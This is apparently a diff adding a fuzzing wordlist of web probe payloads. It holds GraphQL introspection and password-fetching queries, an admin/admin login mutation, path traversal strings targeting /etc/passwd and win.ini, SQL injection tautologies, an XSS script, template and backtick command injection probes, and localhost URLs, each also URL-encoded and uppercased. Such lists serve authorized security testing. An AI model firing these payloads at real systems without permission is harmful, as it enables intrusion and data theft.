@@ -1,0 +1,80 @@
+{__schema{types{name}}}
+query IntrospectionQuery { __schema { queryType { name } } }
+{user(id:1){id,email,password}}
+mutation{login(user:"admin",pass:"admin"){token}}
+/swagger
+/openapi.json
+/graphql
+/graphiql
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%7B__schema%7Btypes%7Bname%7D%7D%7D
+query%20IntrospectionQuery%20%7B%20__schema%20%7B%20queryType%20%7B%20name%20%7D%20%7D%20%7D
+%7Buser%28id%3A1%29%7Bid%2Cemail%2Cpassword%7D%7D
+mutation%7Blogin%28user%3A%22admin%22%2Cpass%3A%22admin%22%29%7Btoken%7D%7D
+%2Fswagger
+%2Fopenapi.json
+%2Fgraphql
+%2Fgraphiql
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+{__SCHEMA{TYPES{NAME}}}
+QUERY INTROSPECTIONQUERY { __SCHEMA { QUERYTYPE { NAME } } }
+{USER(ID:1){ID,EMAIL,PASSWORD}}
+MUTATION{LOGIN(USER:"ADMIN",PASS:"ADMIN"){TOKEN}}
+/SWAGGER
+/OPENAPI.JSON
+/GRAPHQL
+/GRAPHIQL
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%7B__SCHEMA%7BTYPES%7BNAME%7D%7D%7D
+QUERY%20INTROSPECTIONQUERY%20%7B%20__SCHEMA%20%7B%20QUERYTYPE%20%7B%20NAME%20%7D%20%7D%20%7D
+%7BUSER%28ID%3A1%29%7BID%2CEMAIL%2CPASSWORD%7D%7D
+MUTATION%7BLOGIN%28USER%3A%22ADMIN%22%2CPASS%3A%22ADMIN%22%29%7BTOKEN%7D%7D
+%2FSWAGGER
+%2FOPENAPI.JSON
+%2FGRAPHQL
+%2FGRAPHIQL
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+' OR '1'%3D'1
+" OR "1"%3D"1
+{__schema{types{name}}}?v=0
+{__schema{types{name}}}&v=0
+%7B__schema%7Btypes%7Bname%7D%7D%7D_0
+graphql_0
+/graphql/0
+{__schema{types{name}}}%0a0
+query IntrospectionQuery { __schema { queryType { name } } }?v=1
+query IntrospectionQuery { __schema { queryType { name } } }&v=1
